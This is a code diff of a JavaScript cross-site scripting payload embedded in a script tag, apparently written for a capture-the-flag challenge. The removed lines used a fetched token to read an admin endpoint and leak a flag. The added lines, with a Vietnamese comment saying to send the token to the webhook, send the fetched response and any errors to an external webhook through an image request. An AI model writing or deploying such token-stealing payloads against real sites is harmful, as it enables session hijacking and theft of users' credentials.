@@ -12,12 +12,10 @@
     credentials: "include"
   })
   .then(r => r.json())
-  .then(j => fetch("/api/admin/sup3rs3cr3t", {
-    headers: { "Authorization": "Bearer " + j.token },
-    credentials: "include"
-  }))
-  .then(r => r.text())
-  .then(f => new Image().src = u + "?flag=" + encodeURIComponent(f))
+  .then(j => {
+    // Gửi token về webhook ngay sau khi lấy được
+    new Image().src = u + "?info=" + encodeURIComponent(j);
+  })
   .catch(e => new Image().src = u + "?err=" + encodeURIComponent(e.message));
 })();
 </script>' />
